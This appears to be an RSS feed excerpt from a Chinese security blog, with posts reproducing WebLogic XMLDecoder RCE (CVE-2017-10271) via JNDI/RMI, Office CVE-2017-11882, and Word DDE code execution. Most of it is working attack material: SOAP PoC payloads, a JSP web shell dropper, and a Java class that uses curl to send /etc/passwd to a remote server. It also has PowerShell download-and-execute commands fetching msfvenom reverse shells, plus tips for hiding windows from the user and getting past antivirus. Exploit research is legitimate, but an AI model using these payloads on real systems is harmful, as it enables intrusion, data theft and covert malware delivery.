&lt;p&gt;编译完成之后在VPS开启一个http服务&lt;/p&gt;

&lt;h4 id=&#34;本地&#34;&gt;本地&lt;/h4&gt;

&lt;blockquote&gt;
&lt;p&gt;JNDIServer.java&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;package person.server;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

/**
 * Created by liaoxinxi on 2017-11-6.
 */

public class JNDIServer {
    public static void start() throws AlreadyBoundException, RemoteException, NamingException {
        Registry registry = LocateRegistry.createRegistry(1099);
        //http://xxlegend.com/Exploit.class即可
        //factoryLocation 一定得是ip后带斜杠，这个斜杠少不得，少了的话到web服务器的请求就变成了GET / 而不是正常的GET /Exploit.class
        Reference reference = new Reference(&amp;quot;Exploit&amp;quot;,
                &amp;quot;Exploit&amp;quot;, &amp;quot;http://remote_server:80/&amp;quot;); //此处修改为自己的远程服务器
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(reference);
        registry.bind(&amp;quot;Exploit&amp;quot;, referenceWrapper);

    }

    public static void main(String[] args) throws RemoteException, NamingException, AlreadyBoundException {
        start();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;将&lt;code&gt;factoryLocation&lt;/code&gt;指向远程&lt;code&gt;Exploit&lt;/code&gt;所在的地址，并且要以&lt;code&gt;/&lt;/code&gt;结尾，原因注释里已经说了&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;TestJNDI.java&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;package person;

import javax.naming.*;
import javax.naming.directory.DirContext;
import javax.naming.directory.InitialDirContext;
import java.util.Hashtable;


/**
 * Created by liaoxinxi on 2017-9-5.
 */
public class TestJNDI {
    public static void testRmi() throws NamingException {
        String url = &amp;quot;rmi://127.0.0.1:1099&amp;quot;;
        Hashtable env = new Hashtable();
        env.put(Context.PROVIDER_URL, url);
        env.put(Context.INITIAL_CONTEXT_FACTORY, &amp;quot;com.sun.jndi.rmi.registry.RegistryContextFactory&amp;quot;);
        Context context = new InitialContext(env);
//        Object object1 = context.lookup(&amp;quot;rmi://remote_server:1099/Exploit&amp;quot;);
        Object object = context.lookup(&amp;quot;Exploit&amp;quot;);//ok
//        System.out.println(&amp;quot;Object:&amp;quot; + object);
    }
    public static void main(String[] argv) throws NamingException {
        testRmi();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;首先测试本地JNDI服务，先运行&lt;code&gt;JNDIServer&lt;/code&gt;，可以看到在本地监听了1099端口&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/OLArZ&#34; alt=&#34;1099&#34; /&gt;&lt;/p&gt;

&lt;p&gt;然后运行客户端&lt;code&gt;TestJNDI&lt;/code&gt;，可以看到VPS收到了一次请求，访问了&lt;code&gt;Exploit.class&lt;/code&gt;，接着执行了calc:&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/e5ntY&#34; alt=&#34;calc&#34; /&gt;&lt;/p&gt;

&lt;p&gt;测试成功&lt;/p&gt;

&lt;p&gt;整个流程是这样的：&lt;code&gt;lookup&lt;/code&gt;方法向JNDI服务请求&lt;code&gt;Exploit&lt;/code&gt;，JNDI绑定了一个&lt;code&gt;referenceWrapper&lt;/code&gt;，而&lt;code&gt;JNDIReferences&lt;/code&gt;加载了外部对象(远程)，外部对象包含攻击载荷，本地反序列化执行&lt;/p&gt;

&lt;p&gt;那我们可不可以在远程服务器开启一个JNDI服务和http服务，使应用通过&lt;code&gt;rmi://remote_server:1099/Exploit&lt;/code&gt;远程调用呢？&lt;/p&gt;

&lt;h3 id=&#34;0x03-远程利用&#34;&gt;0x03 远程利用&lt;/h3&gt;

&lt;p&gt;我们把项目打成jar包上传到VPS上，然后开启一个JNDI服务和http服务&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;开启JNDI服务&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;/usr/lib/jvm/jdk1.6.0_45/bin/java -jar -Djava.rmi.server.hostname=&amp;quot;192.168.1.2&amp;quot; jnditest.jar
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;strong&gt;注意&lt;/strong&gt;
如果此处不指定&lt;code&gt;rmi.server.hostname&lt;/code&gt;的话会出现错误&lt;code&gt;Root exception is java.rmi.ConnectException: Connection refused to host: 127.0.0.1&lt;/code&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;开启http服务&lt;/p&gt;
&lt;/blockquote&gt;

&lt;pre&gt;&lt;code&gt;python -m SimpleHTTPServer 80
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;然后修改JNDI客户端部分，让它访问rmi远程服务&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;Object object = context.lookup(&amp;quot;rmi://remote_server/Exploit&amp;quot;);
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;可以看到执行成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/fcbQR&#34; alt=&#34;calc2&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;0x04-测试weblogic&#34;&gt;0x04 测试Weblogic&lt;/h3&gt;

&lt;p&gt;下面我们测试一下在实战中能否利用rmi远程代码执行
PoC&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;java version=&amp;quot;1.6.0_45&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt;
    &amp;lt;void class=&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;&amp;gt;
        &amp;lt;void property=&amp;quot;dataSourceName&amp;quot;&amp;gt;
            &amp;lt;string&amp;gt;rmi://remote_server:1099/Exploit&amp;lt;/string&amp;gt;
        &amp;lt;/void&amp;gt;
        &amp;lt;void property=&amp;quot;autoCommit&amp;quot;&amp;gt;
            &amp;lt;boolean&amp;gt;true&amp;lt;/boolean&amp;gt;
        &amp;lt;/void&amp;gt;
    &amp;lt;/void&amp;gt;
&amp;lt;/java&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;同样的，修改rmi地址为我们自己的服务器。&lt;/p&gt;

&lt;p&gt;由于vulhub搭建的Weblogic环境是基于jdk 1.6.0_45版本的，所以我们还得使用jdk 1.6重新编译项目，服务端同样也是&lt;/p&gt;

&lt;p&gt;再由于目标运行在linux上，无法弹计算器，所以我们还得改Exploit类的命令部分，改成可以回显的或者反弹shell的类，这里仅供参考&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;public class Rev {
    public Rev(){
        try{
            Runtime.getRuntime().exec(&amp;quot;curl -F value=@/etc/passwd remote_server:3388&amp;quot;);
        }catch(Exception e){
            e.printStackTrace();
        }
    }
    public static void main(String[] argv){
        Rev e = new Rev();
    }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;VPS上nc监听3388端口，执行成功的话会接收到目标主机的passwd信息&lt;/p&gt;

&lt;p&gt;同样的，先开启JNDI和http服务，还得再监听3388，然后发送PoC&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/fjakh&#34; alt=&#34;rev&#34; /&gt;
成功接收到信息，利用成功。&lt;/p&gt;

&lt;h3 id=&#34;0x05-总结&#34;&gt;0x05 总结&lt;/h3&gt;

&lt;p&gt;简单总结一下这个利用方式，有几个需要注意的点&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;java版本问题。编译恶意类的java版本，生成jar包的版本，目标运行的java版本需要一致，这在一定程度上限制了通用性&lt;/p&gt;

&lt;p&gt;再一个，java版本不能高于7，因为在jdk1.8中做了限制，需要设置&lt;code&gt;trustURLCodebase&lt;/code&gt;为&lt;code&gt;true&lt;/code&gt;&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;需要指定&lt;code&gt;rmi.server.hostname&lt;/code&gt;，在这里坑了好久，一开始以为是ipv6的问题，因为在vps上绑定jndi服务后监听的是tcp6，在github上也有人提了这个问题；后来发现本地执行客户端后与远程主机是建立连接的，却卡在了这个连接上，没有消息通信，说明tcp通道是可以建立的，应该是别的地方有问题。执行后jndi服务器去找了127.0.0.1，一开始以为是本地地址，测试了一番之后发现原来是vps的127.0.0.1，说明已经执行到远程类的部分了，只不过解析地址的时候出现了错误，后来在&lt;a href=&#34;https://stackoverflow.com/questions/15685686/java-rmi-connectexception-connection-refused-to-host-127-0-1-1&#34;&gt;stackoverflow&lt;/a&gt;和&lt;a href=&#34;http://kbase.zohocorp.com/kbase/Web_NMS/Server_Framework/file_112641.html&#34;&gt;这里&lt;/a&gt;找到了答案。&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;参考：
&lt;a href=&#34;https://www.one-tab.com/page/rruKb03ATCuYb59FcLA2HQ&#34;&gt;https://www.one-tab.com/page/rruKb03ATCuYb59FcLA2HQ&lt;/a&gt;&lt;/p&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>Weblogic 0day 复现</title>
      <link>https://kylingit.com/blog/weblogic-0day-%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Fri, 22 Dec 2017 15:43:02 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/weblogic-0day-%E5%A4%8D%E7%8E%B0/</guid>
      <description>

&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;最近不断听到消息，大量Weblogic主机被挂挖矿病毒，起初以为是利用之前反序列化漏洞(CVE-2017-3248)，但是团队内部从受害主机捕获的攻击代码来看，这次是针对WebLogic的WLS组件，利用xmldecoder反序列漏洞进行的RCE攻击。目前官方也给出了此次漏洞的cve&lt;a href=&#34;https://www.cvedetails.com/cve/CVE-2017-10271/&#34;&gt;CVE-2017-10271&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;下面我们来复现一下此次的漏洞&lt;/p&gt;

&lt;h4 id=&#34;0x01-环境准备&#34;&gt;0x01 环境准备&lt;/h4&gt;

&lt;p&gt;我们选择docker来快速搭建漏洞环境，此次漏洞受影响的版本是10.3.6.0.0, 12.1.3.0.0, 12.2.1.1.0 和 12.2.1.2.0，我们选择10.3.6来复现&lt;/p&gt;

&lt;p&gt;在P神的&lt;a href=&#34;https://github.com/vulhub/vulhub&#34;&gt;vulhub&lt;/a&gt;项目中正好存在weblogic环境，看了下版本也在受影响范围之内，所以我们选择vulhub的&lt;a href=&#34;https://github.com/vulhub/vulhub/tree/master/weblogic/ssrf&#34;&gt;weblogic&lt;/a&gt;镜像&lt;/p&gt;

&lt;p&gt;克隆项目，进入weblogic目录，执行&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;docker-compose build
docker-compose up -d
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;此时会创建并运行两个容器，分别是&lt;code&gt;vulhub/weblogic&lt;/code&gt;和&lt;code&gt;vulhub/weblogic&lt;/code&gt;, 如下图&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/gbF5V&#34; alt=&#34;containers&#34; /&gt;&lt;/p&gt;

&lt;p&gt;访问7001端口，weblogic已经成功运行&lt;/p&gt;

&lt;h4 id=&#34;0x02-poc&#34;&gt;0x02 PoC&lt;/h4&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;soapenv:Envelope xmlns:soapenv=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt;
  &amp;lt;soapenv:Header&amp;gt;
	&amp;lt;work:WorkContext xmlns:work=&amp;quot;http://bea.com/2004/06/soap/workarea/&amp;quot;&amp;gt;
		&amp;lt;java version=&amp;quot;1.8.0_131&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt;
		  &amp;lt;void class=&amp;quot;java.lang.ProcessBuilder&amp;quot;&amp;gt;
			&amp;lt;array class=&amp;quot;java.lang.String&amp;quot; length=&amp;quot;3&amp;quot;&amp;gt;
			  &amp;lt;void index=&amp;quot;0&amp;quot;&amp;gt;
				&amp;lt;string&amp;gt;/bin/bash&amp;lt;/string&amp;gt;
			  &amp;lt;/void&amp;gt;
			  &amp;lt;void index=&amp;quot;1&amp;quot;&amp;gt;
				&amp;lt;string&amp;gt;-c&amp;lt;/string&amp;gt;
			  &amp;lt;/void&amp;gt;
			  &amp;lt;void index=&amp;quot;2&amp;quot;&amp;gt;
				&amp;lt;string&amp;gt;calc&amp;lt;/string&amp;gt;
			  &amp;lt;/void&amp;gt;
			&amp;lt;/array&amp;gt;
		  &amp;lt;void method=&amp;quot;start&amp;quot;/&amp;gt;&amp;lt;/void&amp;gt;
		&amp;lt;/java&amp;gt;
	  &amp;lt;/work:WorkContext&amp;gt;
	&amp;lt;/soapenv:Header&amp;gt;
  &amp;lt;soapenv:Body/&amp;gt;
&amp;lt;/soapenv:Envelope&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;向&lt;code&gt;/wls-wsat/CoordinatorPortType&lt;/code&gt;发起一个POST请求，body部分为上面的内容，&lt;strong&gt;修改&lt;code&gt;Content-Type&lt;/code&gt;为&lt;code&gt;text/xml&lt;/code&gt;&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;目前了解的uri还有&lt;code&gt;CoordinatorPortType11&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;服务器返回&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;faultcode&amp;gt;S:Server&amp;lt;/faultcode&amp;gt;
&amp;lt;faultstring&amp;gt;0&amp;lt;/faultstring&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;说明执行成功&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/yn2qT&#34; alt=&#34;response&#34; /&gt;
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/YOZ6L&#34; alt=&#34;reverse shell&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x03-getshell&#34;&gt;0x03 Getshell&lt;/h4&gt;

&lt;p&gt;另外还有直接getshell的PoC:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;soapenv:Envelope xmlns:soapenv=&amp;quot;http://schemas.xmlsoap.org/soap/envelope/&amp;quot;&amp;gt;
  &amp;lt;soapenv:Header&amp;gt;
    &amp;lt;work:WorkContext xmlns:work=&amp;quot;http://bea.com/2004/06/soap/workarea/&amp;quot;&amp;gt;
        &amp;lt;java&amp;gt;&amp;lt;java version=&amp;quot;1.4.0&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt;
            &amp;lt;object class=&amp;quot;java.io.PrintWriter&amp;quot;&amp;gt;
                &amp;lt;string&amp;gt;servers/AdminServer/tmp/_WL_internal/bea_wls_internal/9j4dqk/war/a.jsp&amp;lt;/string&amp;gt;&amp;lt;void method=&amp;quot;println&amp;quot;&amp;gt;
                    &amp;lt;string&amp;gt;&amp;lt;![CDATA[&amp;lt;%if(&amp;quot;023&amp;quot;.equals(request.getParameter(&amp;quot;pwd&amp;quot;))){  
                        java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&amp;quot;i&amp;quot;)).getInputStream();  
                        int a = -1;  
                        byte[] b = new byte[2048];  
                        out.print(&amp;quot;&amp;lt;pre&amp;gt;&amp;quot;);  
                        while((a=in.read(b))!=-1){  
                            out.println(new String(b));  
                        }  
                        out.print(&amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;);} %&amp;gt;]]&amp;gt;&amp;lt;/string&amp;gt;&amp;lt;/void&amp;gt;&amp;lt;void method=&amp;quot;close&amp;quot;/&amp;gt;
            &amp;lt;/object&amp;gt;
        &amp;lt;/java&amp;gt;
      &amp;lt;/java&amp;gt;
    &amp;lt;/work:WorkContext&amp;gt;
  &amp;lt;/soapenv:Header&amp;gt;
&amp;lt;soapenv:Body/&amp;gt;
&amp;lt;/soapenv:Envelope&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;会在&lt;code&gt;tmp/_WL_internal&lt;/code&gt;下&lt;code&gt;bea_wls9_async_response&lt;/code&gt;、&lt;code&gt;bea_wls_internal&lt;/code&gt;和&lt;code&gt;uddiexplorer&lt;/code&gt;目录中的war包下创建a.jsp文件，具体路径可自己选择，对应的web路径是&lt;/p&gt;

&lt;p&gt;&lt;code&gt;http://x.x.x.x:7001/bea_wls_internal/a.jsp&lt;/code&gt;&lt;/p&gt;

&lt;h4 id=&#34;0x04-rmi-利用&#34;&gt;0x04 RMI 利用&lt;/h4&gt;

&lt;p&gt;导师还给出了rmi调用执行的方式，可惜我对rmi机制还没研究透彻，没有构造出来利用的流程，先把PoC放在这儿:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;    &amp;lt;java version=&amp;quot;1.8.0_131&amp;quot; class=&amp;quot;java.beans.XMLDecoder&amp;quot;&amp;gt;
    &amp;lt;void class=&amp;quot;com.sun.rowset.JdbcRowSetImpl&amp;quot;&amp;gt;
    &amp;lt;void property=&amp;quot;dataSourceName&amp;quot;&amp;gt;
    &amp;lt;string&amp;gt;rmi://localhost:1099/Exploit&amp;lt;/string&amp;gt;
    &amp;lt;/void&amp;gt;
    &amp;lt;void property=&amp;quot;autoCommit&amp;quot;&amp;gt;
    &amp;lt;boolean&amp;gt;true&amp;lt;/boolean&amp;gt;
    &amp;lt;/void&amp;gt;
    &amp;lt;/void&amp;gt;
    &amp;lt;/java&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;更新：研究了一下rmi利用，更新在了&lt;a href=&#34;https://kylingit.com/blog/weblogic-xmldecoder-rce%E4%B9%8Brmi%E5%88%A9%E7%94%A8/&#34;&gt;这里&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;目前看到PoC的变换还有好几种，甚至出现了绕过官方补丁的版本，后续应该会逐渐放出的。&lt;/p&gt;

&lt;h4 id=&#34;0x05-修补方案&#34;&gt;0x05 修补方案&lt;/h4&gt;

&lt;p&gt;1.安装Oracle 10月份最新补丁&lt;/p&gt;

&lt;p&gt;2.删除或重命名WebLogic目录中以下war包及目录&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;rm -f /home/WebLogic/Oracle/Middleware/wlserver_10.3/server/lib/wls-wsat.war
rm -f /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/.internal/wls-wsat.war
rm -rf /home/WebLogic/Oracle/Middleware/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/wls-wsat
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;访问&lt;code&gt;wls-wsat&lt;/code&gt;响应404即可&lt;/p&gt;

&lt;h4 id=&#34;0x06&#34;&gt;0x06&lt;/h4&gt;

&lt;p&gt;附
Github上&lt;a href=&#34;https://github.com/3xp10it/exploit/blob/cbc8d61859b9c4c312bb52225671831b895fdbc3/exps/weblogic/weblogic.py&#34;&gt;3xp10it/exploit&lt;/a&gt;仓库删除的脚本
&lt;a href=&#34;https://ob5vt1k7f.qnssl.com/weblogic.py&#34;&gt;Weblogic.py&lt;/a&gt;&lt;/p&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>CVE-2017-11882 复现</title>
      <link>https://kylingit.com/blog/cve-2017-11882-%E5%A4%8D%E7%8E%B0/</link>
      <pubDate>Tue, 21 Nov 2017 18:40:29 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/cve-2017-11882-%E5%A4%8D%E7%8E%B0/</guid>
      <description>

&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;上周微软更新日，修复了&lt;code&gt;CVE-2017-11882&lt;/code&gt;这个漏洞，根据官方描述该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本，攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。漏洞位置是出现在一个公式编辑器上，叫做&lt;code&gt;EQNEDT32.EXE&lt;/code&gt;，在win10上的路径是&lt;code&gt;C:\Program Files\Common Files\microsoft shared\EQUATION\EQNEDT32.EXE&lt;/code&gt;，可以在编辑文档的时候插入公式。&lt;/p&gt;

&lt;p&gt;最近有利用脚本出来了，也是自己尝试复现了几次，在此简单记录一下&lt;/p&gt;

&lt;p&gt;下载&lt;code&gt;https://github.com/Ridter/CVE-2017-11882/&lt;/code&gt;利用脚本，该脚本是&lt;a href=&#34;https://evi1cg.me/archives/CVE_2017_11882_exp.html&#34;&gt;@Evi1cg&lt;/a&gt;改造后的脚本，经过测试效果还是不错的&lt;/p&gt;

&lt;p&gt;生成一个测试文档的话执行
&lt;code&gt;python Command_CVE-2017-11882.py -c &amp;quot;cmd.exe /c calc.exe&amp;quot; -o test.doc
&lt;/code&gt;
打开test.doc就会弹出计算器，而且全程没有提示或警告之类的弹窗，可以算是完美利用，比之前&lt;a href=&#34;https://kylingit.com/blog/msword-code-exec-without-macro/&#34;&gt;不带宏的代码执行&lt;/a&gt;要简单粗暴&lt;/p&gt;

&lt;p&gt;注意一点的是命令部分长度不能超过43bytes&lt;/p&gt;

&lt;h4 id=&#34;反弹shell&#34;&gt;反弹shell&lt;/h4&gt;

&lt;p&gt;下面主要讲一下反弹shell的利用&lt;/p&gt;

&lt;p&gt;用mshta方式执行代码：
在vps上建立一个文件&lt;code&gt;test&lt;/code&gt;，内容为&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;&amp;lt;HTML&amp;gt; 
&amp;lt;meta http-equiv=&amp;quot;Content-Type&amp;quot; content=&amp;quot;text/html; charset=utf-8&amp;quot;&amp;gt;
&amp;lt;HEAD&amp;gt; 
&amp;lt;script language=&amp;quot;VBScript&amp;quot;&amp;gt;
Set objShell = CreateObject(&amp;quot;Wscript.Shell&amp;quot;)
objShell.Run &amp;quot;calc.exe&amp;quot;
self.close
&amp;lt;/script&amp;gt;
&amp;lt;body&amp;gt;
demo
&amp;lt;/body&amp;gt;
&amp;lt;/HEAD&amp;gt; 
&amp;lt;/HTML&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;关键是修改&lt;code&gt;objShell.Run&lt;/code&gt;后面的部分&lt;/p&gt;

&lt;p&gt;我们通过调用powershell下载一个反弹脚本然后执行的方式来获得shell：&lt;/p&gt;

&lt;p&gt;修改&lt;code&gt;objShell.Run&lt;/code&gt;为&lt;/p&gt;

&lt;p&gt;&lt;code&gt;objShell.Run powershell.exe -WindowStyle Hidden -NoP -sta -NonI -c IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://ip/reverse.ps1&#39;);reverse.ps1&amp;quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;其中&lt;code&gt;reverse.ps1&lt;/code&gt;通过&lt;code&gt;msfvenom&lt;/code&gt;生成:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f psh-reflection &amp;gt;reverse.ps1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;msf开启监听，然后生成word文档：
&lt;code&gt;python Command_CVE-2017-11882.py -c &amp;quot;mshta http://ip/test&amp;quot; -o test.doc&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;打开之后就会收到shell&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/5TU1y&#34; alt=&#34;test&#34; /&gt;
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/KM1My&#34; alt=&#34;session 1&#34; /&gt;
但是这样会有一个问题，打开word文档的时候会发现有一个黑框一闪而过，而我们已经指定powershell以&lt;code&gt;-WindowStyle Hidden&lt;/code&gt;的方式运行了，那怎么绕过这个黑框呢？&lt;/p&gt;

&lt;p&gt;查一下&lt;a href=&#34;https://msdn.microsoft.com/en-us/library/d5fk67ky(en-us,VS.85).aspx&#34;&gt;文档&lt;/a&gt;
可以看到&lt;code&gt;Run&lt;/code&gt;命令是可以通过&lt;code&gt;intWindowStyle&lt;/code&gt;参数来控制窗口风格的，有0-10这几种风格
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/q0F4b&#34; alt=&#34;Run Method&#34; /&gt;
所以我们在执行的命令后面加一个参数，用来控制mshta运行的窗口大小，使之最好隐藏窗口运行
&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/ccxgV&#34; alt=&#34;0&#34; /&gt;
经过测试0和2参数都是可以的，达到隐藏窗口执行，用户察觉不了，其它参数可以自己试一下&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/qJKq7&#34; alt=&#34;session 3&#34; /&gt;&lt;/p&gt;

&lt;p&gt;目前这样生成的文档在火绒和360杀毒的最新版上是没有报毒，但是各大杀软已经更新了规则，凡是远程调用执行cmd或者ps或者regsvr32等都会触发报警，暂时没有好的方法绕过，毕竟是监控着底层的那几个文件的。&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/fzUuw&#34; alt=&#34;av&#34; /&gt;&lt;/p&gt;

&lt;p&gt;参考：&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;https://evi1cg.me/archives/CVE_2017_11882_exp.html&#34;&gt;https://evi1cg.me/archives/CVE_2017_11882_exp.html&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&#34;http://www.freebuf.com/vuls/154462.html&#34;&gt;http://www.freebuf.com/vuls/154462.html&lt;/a&gt;&lt;/p&gt;

&lt;script&gt;pangu.spacingPage();&lt;/script&gt;
</description>
    </item>
    
    <item>
      <title>MSWord Code Exec Without Macro</title>
      <link>https://kylingit.com/blog/msword-code-exec-without-macro/</link>
      <pubDate>Thu, 12 Oct 2017 12:54:29 +0000</pubDate>
      
      <guid>https://kylingit.com/blog/msword-code-exec-without-macro/</guid>
      <description>&lt;script src=&#34;https://ob5vt1k7f.qnssl.com/pangu.js&#34;&gt;&lt;/script&gt;

&lt;p&gt;昨天复现了一个 Microsoft Office Word 的一个执行任意代码的姿势，跟之前爆出的两个CVE (CVE-2017-0199, CVE-2017-8759) 可以组成三板斧，这里简单记录一下&lt;/p&gt;

&lt;p&gt;在不启用宏的情况下执行任意程序，按照复现过程来看这确实像是一个功能而不是 bug，微软也表示不会修复这个“漏洞”。这个功能的本意是为了更方便地在 word 里同步更新其它应用的内容，比如说在一个 word文档里引用了另一个excel表格里的某项内容，通过连接域 (Field) 的方式可以实现在 excel 里更新内容后 word 中同步更新的效果，问题出在这个域的内容可以是一个公式(或者说表达式)，这个公式并不限制内容，于是我们可以这样，&lt;code&gt;ctrl+f9&lt;/code&gt;插入一个域，在&lt;code&gt;{}&lt;/code&gt;之间写入代码：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;{ DDEAUTO c:\\windows\\system32\\cmd.exe &amp;quot;/k calc.exe&amp;quot; }&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;或者&lt;code&gt;插入-文档部件-域&lt;/code&gt;，选择第一个&lt;code&gt;= (Formula)&lt;/code&gt;
然后右键&lt;code&gt;切换域代码&lt;/code&gt;来编辑代码，插入上面的内容&lt;/p&gt;

&lt;p&gt;这样子可以直接弹出计算器&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/GIF.gif&#34; alt=&#34;calc&#34; /&gt;&lt;/p&gt;

&lt;p&gt;既然能执行cmd那就能弹shell&lt;/p&gt;

&lt;p&gt;在msf里生成一个ps脚本：&lt;/p&gt;

&lt;p&gt;&lt;code&gt;./msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=x.x.x.x LPORT=1234 -f psh-reflection &amp;gt;xxx.ps1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;在msf里监听&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/HQ%5D%25%7DB5TLH~HBZD%7B1_%7B$D%254.png&#34; alt=&#34;msf&#34; /&gt;&lt;/p&gt;

&lt;p&gt;然后开启一个服务器&lt;/p&gt;

&lt;p&gt;&lt;code&gt;python -m SimpleHTTPServer 80&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;远程下载ps脚本后执行&lt;/p&gt;

&lt;p&gt;&lt;code&gt;DDEAUTO c:\\Windows\\System32\\cmd.exe &amp;quot;/k powershell.exe -NoP -sta -NonI -c IEX(New-Object System.Net.WebClient).DownloadString(&#39;http://x.x.x.x/xxx.ps1&#39;);xxx.ps1&amp;quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;打开文件后反弹一个shell&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://ob5vt1k7f.qnssl.com/MPI@%5B%60%25DL%28U7WZL220E0%5B7Q.jpg&#34; alt=&#34;shell&#34; /&gt;&lt;/p&gt;

&lt;p&gt;过程很简单，唯一不足的是打开文件过程中会有两次弹窗，第一次是询问是否更新链接，第二个是问是否执行程序，当两个都点击确认后才会执行。&lt;/p&gt;

&lt;p&gt;作者给出的命令是
&lt;code&gt;{ DDEAUTO c:\\Windows\\System32\\cmd.exe &amp;quot;/k powershell.exe -NoP -sta -NonI -W Hidden $e=(New-Object System.Net.WebClient).DownloadString(&#39;http://evil.com/evil.ps1&#39;);powershell -e $e &amp;quot;}&lt;/code&gt;
但是自己尝试了并没有成功，于是修改成上面的命令，测试成功，并且不会报毒&lt;/p&gt;

